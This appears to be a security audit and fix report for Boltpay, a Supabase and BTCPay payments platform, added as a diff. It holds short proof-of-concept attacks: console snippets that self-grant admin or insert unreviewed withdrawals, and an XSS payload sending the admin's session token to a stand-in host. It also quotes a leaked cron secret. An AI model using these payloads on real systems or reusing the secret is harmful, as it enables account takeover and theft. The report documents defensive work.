@@ -1,0 +1,617 @@
+# Boltpay — Audit & Fix Report
+
+Reviewed: 18 migrations, 5 Edge Functions, 7 HTML pages, 1 Cloudflare Worker.
+Everything below is fixed in the attached zip unless marked **NOT CHANGED**.
+
+Verification run on the patched code:
+- All 18 migrations parse under the real PostgreSQL grammar (`pglast`/libpg_query)
+- All 5 Edge Functions compile under `esbuild`
+- All inline scripts in all 7 HTML pages pass `node --check`
+
+---
+
+## CRITICAL — money and account takeover
+
+### 1. Any creator could make themselves an admin
+
+`0002` had:
+
+```sql
+create policy "update own profile" on profiles for update
+using (id = auth.uid());
+```
+
+No `WITH CHECK`, no column restrictions. From the browser console, with nothing
+but the public anon key:
+
+```js
+await supabaseClient.from('profiles')
+  .update({ role: 'admin', withdrawal_fee_percent: 0, max_payment_links: 9999 })
+  .eq('id', myId);
+```
+
+That is full admin: approve your own withdrawals, force BTCPay payouts, read
+every creator's wallet details.
+
+**Fixed** — `WITH CHECK` added, plus a `guard_profile_updates()` trigger that
+rejects any change to `role`, `email`, `withdrawal_fee_percent`,
+`max_payment_links`, `auto_withdraw_enabled`, `buy_rate` or `sell_rate` from a
+non-admin. Creators can still edit their display name and wallet fields.
+
+### 2. Withdrawals could be created straight from the browser
+
+`0002` also had an INSERT policy on `withdrawals` whose only condition was
+`user_id = auth.uid()`. Every balance check, fee calculation and minimum-amount
+rule lived in `request_withdrawal()` — which nothing forced you to call:
+
+```js
+await supabaseClient.from('withdrawals').insert({
+  user_id: myId, amount_requested: 999999, fee_percent: 0,
+  amount_after_fee: 999999, method: 'bkash',
+  destination: 'x', status: 'approved'   // straight past the review queue
+});
+```
+
+**Fixed** — the client INSERT policy is dropped. `withdrawals` can now only be
+written by `request_withdrawal()` and `system_queue_withdrawal()`, both
+`SECURITY DEFINER`. A second trigger blocks editing `amount_requested`,
+`amount_after_fee`, `fee_percent`, `destination` or `user_id` on an existing row.
+
+### 3. Two different balance formulas — the same money paid out twice
+
+The codebase disagreed with itself about what "available balance" means:
+
+| Definition | Used by |
+|---|---|
+| A: `sum(settled payments) − sum(non-rejected withdrawals)` | `request_withdrawal()`, creator dashboard |
+| B: `sum(settled payments where withdrawal_id is null)` | `user-withdraw`, webhook auto-queue |
+
+A manual request under (A) never tagged any payment rows, so (B) still counted
+that money as unspent. Withdraw $100 through the dashboard, wait for the next
+payment to settle, and the auto-queue creates a *second* withdrawal covering the
+same $100.
+
+Model (B) was independently broken in two more ways:
+- Withdrawing $5 out of a $500 balance tagged **every** payment row to that
+  withdrawal, freezing the other $495.
+- A rejected withdrawal never released its tagged payments, so the money was
+  gone permanently.
+
+**Fixed** — model (A) is now the only definition, in `get_balance_for()`.
+`get_my_balance()` is the creator-facing wrapper the dashboard calls, so the UI
+figure and the server figure cannot drift. `user-withdraw` no longer does its
+own maths — it calls `request_withdrawal()` with the user's JWT.
+
+### 4. Concurrent withdrawals could both pass the balance check
+
+`0017` tried to lock with `perform 1 from payments where user_id = v_uid and
+status = 'settled' for update`. That locks payment rows, not the thing being
+contended, and locks nothing at all when the user has no settled rows matching.
+Two parallel requests could each see the full balance.
+
+**Fixed** — `request_withdrawal()` and `system_queue_withdrawal()` both take
+`select ... from profiles where id = v_uid for update` first, which serialises
+every withdrawal path per creator.
+
+### 5. Double-click on "Force BTCPay Payout" sent two real payouts
+
+`/process-withdrawal` read the row, called BTCPay, then wrote `status = 'paid'`
+unconditionally. Nothing checked the current status, so two clicks produced two
+Lightning payouts for one request.
+
+**Fixed** — `system_claim_withdrawal(id, next_status)` performs the transition as
+a single conditional `UPDATE ... WHERE status IN ('pending','approved')` and
+returns whether it won. The claim happens *before* the BTCPay call; a losing
+caller gets `409 Already processed`. On payout failure the row returns to
+`pending` for manual review.
+
+### 6. Stored XSS in the admin panel
+
+Creator-controlled text was interpolated raw into `innerHTML` in the admin
+panel: `display_name` (set from signup metadata), `w.destination` (free-text
+withdrawal field), `owner_email`, `creator_email`, `link_slug`. A creator
+registering with
+
+```
+display_name: <img src=x onerror="fetch('https://evil/'+localStorage.getItem('sb-...-auth-token'))">
+```
+
+exfiltrates the admin's session the moment the admin opens the Customers tab —
+and that session can force payouts.
+
+**Fixed** — every one of those sinks now goes through `escapeHtml` /
+`escapeAttr` / new `safeText` / `safeMethod` helpers. The remaining raw
+interpolations are UUIDs, booleans and CHECK-constrained status strings.
+
+### 7. Anonymous read of the entire payments table
+
+```sql
+create policy "anon can watch invoice status for realtime"
+on payments for select to anon using (true);
+```
+
+The column grant hid `user_id`, but anyone with the anon key (it is in
+`config.js`, by design) could `select` amount, status and expiry for **every
+payment ever made** — the whole revenue ledger.
+
+**Fixed** — narrowed to `expires_at > now() - interval '2 hours'`. That is wide
+enough for a 60-minute invoice plus its settle event, so Realtime still works,
+and all history is private.
+
+---
+
+## HIGH
+
+### 8. Instant Lightning payouts could never succeed
+
+`user-withdraw` inserted `status: "processing"`, but the CHECK constraint on
+`withdrawals.status` only allowed `pending|approved|rejected|paid`. Every
+instant payout died on a constraint violation and returned a generic 500.
+
+**Fixed** — `processing` added to the constraint.
+
+### 9. Withdrawal method validation was deleted and never replaced
+
+`0017` ran `alter table withdrawals drop constraint if exists
+withdrawals_method_check` and also removed the `p_method` check from
+`request_withdrawal()`. Any string was accepted as a payout method.
+
+**Fixed** — constraint restored as
+`('bkash','nagad','binance','lightning','usdt_bep20','bank')` (added `NOT VALID`
+so it cannot fail on legacy rows), and the function validates against the same
+list.
+
+### 10. Webhook wrote an unreliable settled amount
+
+`updatePayload.amount_settled = event.amount ?? payment.amount_requested`. The
+`InvoiceSettled` payload does not carry a dependable fiat amount — so this was
+either `undefined` or, on an overpayment, a BTC-denominated number being written
+into a USD column.
+
+**Fixed** — the webhook now fetches the invoice from BTCPay, confirms
+`currency === "USD"`, and uses that amount; it falls back to `amount_requested`
+otherwise.
+
+### 11. A settled payment could be downgraded to expired
+
+The webhook applied whatever status the event implied. A late `InvoiceExpired`
+after `InvoiceSettled` would flip a settled payment back — silently reducing a
+creator's balance below money they may already have withdrawn.
+
+**Fixed** — settled is terminal. Early return in the webhook, a conditional
+`.neq('status','settled')` on the update, and `admin_mark_payment()` now refuses
+to touch a settled row.
+
+### 12. Missing cron secret failed open
+
+```ts
+if (req.headers.get("x-cron-secret") !== Deno.env.get("CRON_SECRET"))
+```
+
+If `CRON_SECRET` was never set, a request with no header compared
+`null !== undefined` — true, so it rejected. But the config was still one typo
+away from exposing the full ledger export publicly, and the intent was unclear.
+
+**Fixed** — both `daily-report` and `ledger-backup` now refuse everything when
+`CRON_SECRET` is empty. Same guard added to `BTCPAY_WEBHOOK_SECRET`, where the
+consequence was worse: HMAC over an empty key is something an attacker can
+reproduce, so every forged webhook would have been accepted.
+
+### 13. Live cron secret committed to the repo
+
+`ledger-backup/ledger-backup-trigger.sql` contained
+`'x-cron-secret', 'parvezmosharafvu'` and the live project URL, in Git.
+
+**Fixed** — rewritten to read both from Supabase Vault. **The old secret is
+burned — rotate it.**
+
+### 14. Customer emails committed to the repo
+
+`ledger-backups/*.json` are real production snapshots containing real email
+addresses and the admin account's identity, and `ledger-backup/index.ts` selects
+`email` on every run. If that repo is public, this is a continuous PII leak.
+
+**Fixed** — `email` removed from the export (`id` is enough to rejoin on
+restore). **NOT CHANGED:** the five existing snapshot files are left in place —
+deleting them from the working tree does not remove them from Git history. If
+the repo is or ever was public, treat those addresses as disclosed.
+
+### 15. A creator could rewrite the admin's messages
+
+The `support_messages` UPDATE policy had a `USING` clause and no `WITH CHECK`.
+The UI hid the Edit button on admin messages; the API did not.
+
+**Fixed** — `WITH CHECK` added plus `guard_message_updates()`, which allows
+flipping read/delete flags on any message in your own thread but only editing
+text you wrote yourself, and blocks changing `sender` or `user_id`.
+
+### 16. Reserved slugs were never enforced
+
+The reserved-name list existed in three JavaScript files and was binding in
+none of them. A creator could POST `slug: 'admin'` to PostgREST directly and
+shadow `/admin` on every payment domain.
+
+**Fixed** — `validate_link_slug()` trigger enforces the format
+`^[a-z0-9][a-z0-9-]{2,48}[a-z0-9]$` and the reserved list in the database.
+
+---
+
+## MEDIUM
+
+### 17. `create-invoice` would 401 in production
+Deployment docs only mentioned deploying `btcpay-webhook`. `404.html` calls
+`create-invoice` with no `Authorization` header, so without `--no-verify-jwt`
+every payment attempt fails. **Fixed** in `docs/DEPLOYMENT.md`, with the reason
+each function gets the flag it gets.
+
+### 18. No abuse limit on invoice creation
+`create-invoice` is unauthenticated by design. Nothing stopped a script from
+spinning up unlimited real invoices on the merchant's node. **Fixed** — max 10
+invoices per link per minute, returns `429`.
+
+### 19. Orphaned BTCPay invoices
+If the DB insert failed after BTCPay created the invoice, the merchant was left
+with a live invoice Boltpay had no record of. **Fixed** — the invoice is
+archived on insert failure.
+
+### 20. `Number(body.amount)` accepted junk
+`!amount || amount < 1` let some `NaN`/`Infinity` shapes through, and fractional
+cents reached BTCPay as an amount the ledger could never match. **Fixed** —
+`Number.isFinite` plus rounding to 2dp. Slug format validated too.
+
+### 21. BTCPay error bodies returned to the browser
+`return json({ error: "...", detail: errText })` leaked store/node internals to
+any visitor. **Fixed** — logged server-side, generic message returned.
+
+### 22. `is_admin()` had no pinned `search_path`
+Every other `SECURITY DEFINER` function in the repo pins it; this one didn't,
+leaving it open to a search-path hijack. **Fixed.**
+
+### 23. `app_settings` was world-readable
+`using (true)` exposed `profit_margin_percent`, `exchange_rates` and the
+auto-withdraw threshold to anonymous visitors. **Fixed** — anon sees only
+`platform_notice` and `site_domain`; creators see the handful of keys their
+pages actually render; admins see everything.
+
+### 24. Link limit bypass
+`0017` changed the limit to count only *active* links, but the trigger still
+fired only on INSERT. Deactivate one, create a new one, reactivate the old one,
+and you sit above the limit forever. **Fixed** — trigger now fires on
+`INSERT OR UPDATE`.
+
+### 25. `admin_mark_payment` accepted any amount
+Including negative numbers, which would corrupt every balance derived from
+`sum(amount_settled)`. **Fixed** — range check, row lock, already-settled guard.
+
+### 26. "Clear history" did nothing visible to creators
+`0017` made it a soft delete via `deleted_by_creator`, but the dashboard never
+filtered on the flag. **Fixed.**
+
+### 27. `w.method.toUpperCase()` crashed the whole list
+`method` is nullable and the auto-queue could produce rows without one. One null
+threw inside `.map()` and blanked the entire withdrawals list in both panels.
+**Fixed** via `safeMethod()`.
+
+### 28. Auto-withdraw toggle showed the wrong state
+`cu.auto_withdraw_enabled !== false` treated `null` as enabled, so creators who
+had never been granted instant Lightning appeared in the admin panel as already
+granted. **Fixed** to `=== true` (the column defaults to `false`).
+
+### 29. Auto-queue could create unpayable requests
+The webhook queued withdrawals with `destination: "Not set — creator must
+update"` and `method: "usdt_bep20"` regardless of what the creator had
+configured. **Fixed** — `system_queue_withdrawal()` resolves the destination
+from the creator's saved wallet for that method and skips queueing entirely if
+there isn't one, leaving the balance withdrawable instead.
+
+---
+
+## NOT CHANGED — needs your decision
+
+**A. The admin profit formula.** `admin_global_stats()` computes
+
+```sql
+total_admin_profit  = total_settled × (margin/100) / 2.0
+calculated_node_balance = total_settled × (1 + margin/100)
+```
+
+The `/ 2.0` and the `1 +` both look deliberate but neither is documented, and I
+won't quietly change money maths. Two things to note: the node-balance formula
+grows the balance as settlements rise, which reads backwards for a figure meant
+to represent funds held; and this profit number disagrees with the one
+`daily-report` writes into `daily_stats`, which uses
+`total_settled × (sell_rate − buy_rate)`. Since `0017` seeds both rates at
+`133.0`, that second formula currently returns exactly **0** — so the admin
+panel's Earnings tab shows zero profit per day while the header stat shows a
+non-zero number. Pick one definition.
+
+**B. Anon Realtime is still a two-hour window.** Narrowed, not eliminated —
+someone with the anon key can still enumerate currently-live invoices. Closing
+it fully means dropping the anon policy and polling `get_invoice_public()` every
+few seconds on the invoice page instead. That's a real trade-off; say the word
+and I'll switch it.
+
+**C. `payments.withdrawal_id` is now unused.** Left in place so existing rows
+and the ledger backups stay readable. Safe to drop later.
+
+---
+
+## Do these before redeploying
+
+1. Run migration `0018_security_and_integrity_fixes.sql`.
+2. Rotate `CRON_SECRET` — the old one is in Git history.
+3. Make the GitHub repo private if `ledger-backup` is enabled.
+4. Redeploy all five Edge Functions with the flags in `docs/DEPLOYMENT.md`.
+5. Check for damage already done:
+
+```sql
+-- anyone who promoted themselves before 0018
+select id, email, role, withdrawal_fee_percent from profiles where role = 'admin';
+
+-- withdrawals that never came from request_withdrawal()
+select * from withdrawals where fee_percent = 0 or amount_after_fee > amount_requested;
+
+-- creators paid more than they earned
+select p.email, b.* from profiles p, get_balance_for(p.id) b where b.available < 0;
+```
+
+6. Run the regression queries in `docs/DEPLOYMENT.md` §6 as a non-admin user.
+
+---
+
+## Re-audit — 2026-08-27
+
+Re-reviewed the whole tree after the reformat, with 0003 and 0018 read line by line.
+
+**Confirmed working in production**, from the 2026-08-26 ledger snapshot:
+`request_withdrawal` produced a real bkash withdrawal that reached `paid`,
+which means `system_claim_withdrawal` and `/process-withdrawal` both work end
+to end. The snapshot also has no `email` field, so the PII fix is deployed.
+
+### Fixed in migration 0019
+
+**19a. `/admin-mark-settled` was broken — a regression I introduced.**
+0018 moved the bounds and already-settled checks into `admin_mark_payment()`,
+and I changed the webhook route to call it. But that route calls it with the
+**service role** client, and a service-role JWT has no `sub` claim, so
+`auth.uid()` is null, `is_admin()` returns false, and the admin panel's
+"Approve" button on a stuck payment failed with `Not authorized`.
+`admin_mark_payment()` now also accepts the service role (that route already
+verifies an admin JWT in code first), and `btcpay-webhook` calls it with the
+admin's own client instead.
+The "Mark expired" button was never affected — it calls the same function
+directly with the admin's JWT.
+
+**19b. anon still had EXECUTE on every `admin_*` function.**
+Migrations 0008 and 0013-0015 only did `revoke all ... from public`. In a
+Supabase project, `anon` and `authenticated` are granted EXECUTE explicitly via
+`ALTER DEFAULT PRIVILEGES`, not through `PUBLIC` — so revoking PUBLIC left both
+roles untouched. Not exploitable: every one of those functions opens with
+`if not is_admin() then raise`. Tightened anyway, along with revoking API access
+to the trigger functions.
+
+### Checked and correct
+
+- **0003.** `request_withdrawal` and `admin_global_stats(date,date)` from this
+  file are dead — superseded by 0017/0018 and dropped respectively.
+  `get_invoice_public` and `get_link_preview` are the live versions and are
+  sound; `get_link_preview`'s grant is now explicit for both roles.
+- **0018.** Balance model, row locking, both guard triggers, the claim function,
+  the narrowed anon Realtime window, the link-limit and slug triggers, and the
+  `app_settings` split all re-read and correct. The `get_balance_for` revoke now
+  includes `authenticated`.
+- HTML tag balance valid on all 7 pages after the reformat; every security fix
+  from the previous pass is still present. All 19 migrations parse under the
+  real PostgreSQL grammar, all 5 Edge Functions compile.
+
+### Still open
+
+- **DB/repo drift.** The project has two functions that exist in no migration:
+  `public.rls_auto_enable` and `public.slug_exists`. Read their bodies
+  (`select prosrc from pg_proc where proname in ('rls_auto_enable','slug_exists')`)
+  and either add them to a migration or drop them. `rls_auto_enable` is worth
+  reading first — a function that touches RLS and is not in version control is
+  the kind of thing that quietly undoes a policy.
+- **0006 seeds `exchange_rates` at buy 1.0 / sell 1.0.** `daily-report` computes
+  `total_settled × (sell − buy)`, so every row written to `daily_stats` has
+  `total_admin_profit = 0` and the admin Earnings tab shows nothing. Item A in
+  the section above is still the decision to make.
+- **`get_invoice_public` ignores the two-hour window** that 0018 applied to the
+  anon `payments` policy. It is `SECURITY DEFINER`, so anyone holding an old
+  payment UUID can still read that invoice's amount and status. UUIDs are
+  unguessable and this keeps the success screen working on a late reopen, so it
+  was left alone — but the two paths are deliberately inconsistent.
+- **Client/DB slug rules differ.** `dashboard.html` rejects slugs under 3
+  characters; `validate_link_slug()` requires 4. A 3-character slug passes the
+  browser check and then fails with a database error.
+- Do not press **Save** on the Data API "Exposed functions" screen. The orange
+  entries are locked on purpose; saving rewrites grants from the checkbox state
+  and would undo both the `payments` column-level grant and these revokes.
+
+---
+
+# Round 2 — full-system audit, September 2026
+
+Reviewed: 48 migrations, 8 Edge Functions, 8 HTML pages, 1 Cloudflare Worker.
+
+## Critical — silent data loss
+
+### C1. The ledger backup had stopped backing up
+
+`ledger-backup` called `.select("*")` with no `.range()`. PostgREST caps
+every response at 1000 rows, and the query sorted `created_at` **ascending**
+— so once the ledger passed a thousand payments it kept the oldest thousand
+and dropped every newer one.
+
+The committed snapshots showed it happening:
+
+```
+2026-09-01 :  654 rows | newest payment 09-01 10:51
+2026-09-02 :  897 rows | newest payment 09-02 10:59
+2026-09-03 : 1000 rows | newest payment 09-03 02:47   ← hit the cap
+2026-09-04 : 1000 rows | newest payment 09-03 02:47   ← unchanged, 24h later
+```
+
+**Fixed:** paginated `fetchAll()`, plus a `COUNT` verification that aborts
+the commit and alerts if the snapshot is short. A backup that quietly stops
+is worse than no backup, because nothing looks wrong.
+
+### C2. Creators were shown an understated lifetime total
+
+`fetchPayments()` had the same 1000-row cap, and `computeStats()` and
+`renderTiers()` both summed that capped array. A creator with 2213 payments
+saw a total built from 1000 of them — and a tier badge to match.
+
+**Fixed:** migration 0042 adds `get_my_totals()`. Every figure on the card
+is now counted in the database. Verified against a capped list: shows
+`$97,327.61 / 2213` where the old code showed `$40,000 / 1000`.
+
+### C3. Two different definitions of "a day"
+
+`daily-report` summed rows fetched from PostgREST (same cap) and bucketed by
+**midnight** Dhaka, while every live view on the site bucketed **5pm–5pm**.
+Archive and screen disagreed about which day a payment belonged to.
+
+**Fixed:** migration 0043 adds `daily_totals_for_cycle()`. The sums happen in
+SQL with no row limit, on the one cycle boundary the whole system now shares.
+
+## High — the global Lightning switch did nothing
+
+`user-withdraw` checked only the per-creator `auto_withdraw_enabled` flag,
+never the global master switch. The admin panel's own help text said *"Off
+here means no creator gets an instant payout, whatever their own profile
+says"* — which was not true. Creators with their own flag on kept receiving
+instant payouts after the master switch was turned off.
+
+**Fixed:** the server now requires both, and the dashboard's copy of the
+check fails closed instead of open.
+
+## Medium
+
+| | |
+|---|---|
+| No index on `payments(created_at)` despite both panels ordering by it | Fixed in 0044 |
+| `prune_webhook_events()` existed but its cron schedule was only a comment | Scheduled in 0044 |
+| Statement timeout (57014) on a `support_messages` UPDATE | Lock contention; 0034 had already indexed it, and the 0044 indexes remove the slow sorts it was queueing behind |
+| Message threads sorted ascending with no limit — long threads would hide the newest messages | Fixed: newest-first with an explicit cap, reversed for display |
+
+## What was added
+
+- **`reconcile`** — the only job that looks outside Boltpay. Compares
+  BTCPay's settled invoices against the ledger daily and names the specific
+  invoices that never arrived. Read-only: it reports, a human decides.
+- **`health`** — five checks every 15 minutes, alerting on genuine faults
+  and staying quiet when there is simply no traffic. Returns 503 when
+  unhealthy so an uptime monitor can page on the status code alone.
+- **`audit_log`** (0047) — append-only record of fee, role, assignment and
+  instant-payout changes, with old and new values. No update or delete
+  policy exists for anyone, including admins.
+- **Server-side pagination** (0046) for both payment feeds, with an honest
+  "Showing N of TOTAL".
+- **CSV export** for creators, fetching all pages rather than exporting
+  whatever is on screen.
+- **Idle session timeout** on the two staff panels.
+- **CI** (`.github/workflows/verify.yml`) running every check that was
+  previously done by hand.
+
+## Found by the CI on its first run
+
+Worth recording, because it justifies the CI existing:
+
+1. `daily-report` and `reconcile` both read properties off an untyped
+   `.rpc().maybeSingle()` result, which TypeScript infers as `{}`.
+   `deno check` rejects it; **esbuild does not, because it strips types
+   rather than checking them**. The verification used during development
+   was the wrong tool.
+2. The workflow itself had an indented heredoc terminator inside a shell
+   loop (which never terminates) and created none of the Supabase roles,
+   so all 104 `grant … to authenticated` statements would have failed.
+
+## Verified healthy
+
+- 48 migrations parse under the real PostgreSQL grammar
+- 8 Edge Functions build; the two type errors above are fixed
+- 8 pages pass HTML, JavaScript, element-reference and handler checks
+- Every `rpc()` call matches its SQL definition
+- RLS is enabled on every table
+- Every `SECURITY DEFINER` function sets `search_path`
+- `request_withdrawal()` serialises with `FOR UPDATE`;
+  `system_claim_withdrawal()` is an atomic compare-and-swap
+- CSP and security headers cover every origin the pages use
+
+## Still open
+
+- Archival of payments older than a year, and a materialised view for the
+  daily rollups — both premature at current volume
+- Two-factor authentication for admin and moderator accounts
+- A staging environment for testing migrations before production
+- Creator onboarding flow, customer receipts, login rate limiting
+
+---
+
+# Round 3 — external audit review, September 2026
+
+An independent AI review (Manus) of `boltpay-fixed.zip` raised five
+findings. Each was verified against the actual function bodies before
+acting on it — one did not hold up, four did.
+
+## Rejected
+
+**"Mixed-case links are broken because `validate_link_slug()` lowercases
+new slugs."** Checked the trigger directly: it calls `lower()` exactly
+once, inside the reserved-name comparison (`if lower(new.slug) in (...)`),
+and never assigns the result back to `new.slug`. The slug itself is only
+`trim()`'d. `AliceSmith` is stored as `AliceSmith`, and `get_link_preview()`
+already does an exact, case-sensitive match by design — that is the whole
+mechanism that lets `/sophia`, `/Sophia`, `/SophiaK` and `/Sophia-K` be
+four distinct links on four distinct rates. Nothing changed here.
+
+## Confirmed and fixed
+
+**`clear_message_thread()` still hard-deleted.** 0049 added
+`hide_message()` for single messages and dropped the DELETE policy, but
+never touched the "Clear entire conversation" function — its admin
+branch still ran `delete from support_messages`. The one button that
+clears an entire thread could bypass the soft-delete guarantee the rest
+of that migration existed for.
+
+**Fixed in 0050:** the admin branch now sets `deleted_by_admin = true`
+instead of deleting, and the action is recorded in `audit_log`.
+
+**Manual settlement had no ceiling relative to what was requested.**
+`admin_mark_payment()` checked that a manually-entered settlement amount
+was positive and under 100,000 — never against that payment's own
+`amount_requested`. A $1 invoice could be marked settled for $50,000,
+which `get_balance_for()` would add to the creator's withdrawable balance
+in full.
+
+**Fixed in 0050:** capped at 102% of `amount_requested` (a small
+allowance for a payer who rounds up), with the specific numbers in the
+error message. Verified against the exact $1-requested / $50,000-settled
+scenario from the finding — now rejected — alongside the boundary
+($1 requested / $1.02 settled passes, $1.03 does not).
+
+**CORS fallback host normalization did not match the primary path.**
+Both `btcpay-webhook` and `user-withdraw` reduce `ALLOWED_ORIGINS` entries
+to bare lowercase hosts on the normal path, but the fallback taken when
+the `site_domains` lookup fails returned the raw, un-normalized secret
+value. With a full-URL secret (`https://pay.example.com`), the working
+path compared `pay.example.com` while the fallback compared
+`https://pay.example.com` — never equal, so every legitimate browser
+request lost its CORS header for as long as the database hiccup lasted.
+Not an auth bypass; an availability bug, and one that only appears at
+exactly the moment a payout or a payment matters most.
+
+**Fixed:** a single `normalizeOriginHost()` used on every path in both
+functions — static origins, database hosts, and the fallback. Verified
+the normal and fallback paths now produce identical sets, and that
+`https://Pay.Example.com/`, `pay.example.com` and
+`HTTPS://PAY.EXAMPLE.COM` all normalize to the same value.
+
+**README's migration range was stale.** Said `0001 → 0048`; `0049`
+already existed. Updated to `0001 → 0050`.
+
+## Verified healthy (unchanged from Round 2)
+
+All 50 migrations parse clean, all 8 Edge Functions compile, all 8 pages
+pass static checks, every `rpc()` call matches its SQL definition.
